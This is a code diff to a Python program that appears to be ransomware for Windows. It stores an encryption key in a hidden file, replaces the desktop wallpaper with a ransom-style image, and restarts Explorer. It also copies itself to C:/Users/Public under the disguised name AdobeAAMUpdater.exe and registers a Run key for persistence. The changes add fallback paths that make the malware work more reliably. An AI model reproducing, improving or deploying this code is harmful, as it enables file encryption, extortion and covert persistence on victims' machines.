@@ -1,6 +1,7 @@
 from Func import Crypt
 from Func import k
 from os import path,getenv
+from sys import argv
 from os import system as sys
 from platform import system
 from shutil import copyfile
@@ -27,9 +28,16 @@ if s=='Windows':
 		key.write(k)
 		key.close()
 		sys('cd '+documents)
-		sys('attrib +s +h '+documents+'\\.officek')
+		sys('attrib +s +h '+documents+'/.officek')
 	except:
-		pass
+		try:
+			key = open('C:/Users/Public/.officek','wb')
+			key.write(k)
+			key.close()
+			sys('cd C:/Users/Public')
+			sys('attrib +s +h C:/Users/Public/.officek')
+		except:
+			pass
 
 	try:
 		bg = Crypt.resource_path('bg.jpg')
@@ -38,15 +46,25 @@ if s=='Windows':
 
 	try:
 		appdata = getenv('APPDATA')
-		dest = appdata+"\\Microsoft\\Windows\\Themes"
-		copyfile(dest+'\\TranscodedWallpaper',dest+'\\.transold')
-		copyfile(bg,dest+"\\TranscodedWallpaper")
+		dest = appdata+'/Microsoft/Windows/Themes'
+		copyfile(dest+'/TranscodedWallpaper',dest+'/.transold')
+		copyfile(bg,dest+"/TranscodedWallpaper")
 		sys('cd '+dest)
-		sys('attrib +s +h '+dest+'\\.transold')
+		sys('attrib +s +h '+dest+'/.transold')
 		sys("taskkill /f /im explorer.exe")
 		sys("start C:/Windows/explorer.exe")
 	except:
-		pass
+		try:
+			appdata = getenv('APPDATA')
+			dest = appdata+'/Microsoft/Windows/Themes'
+			copyfile(dest+'/TranscodedWallpaper.jpg',dest+'/.transold')
+			copyfile(bg,dest+"/TranscodedWallpaper.jpg")
+			sys('cd '+dest)
+			sys('attrib +s +h '+dest+'/.transold')
+			sys("taskkill /f /im explorer.exe")
+			sys("start C:/Windows/explorer.exe")
+		except:
+			pass
 
 	keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 	try:
@@ -55,7 +73,7 @@ if s=='Windows':
 		key = CreateKey(HKEY_CURRENT_USER, keypath)
 	
 	try:
-		copyfile(sys.argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
+		copyfile(argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
 		p = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
 		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
 	except:
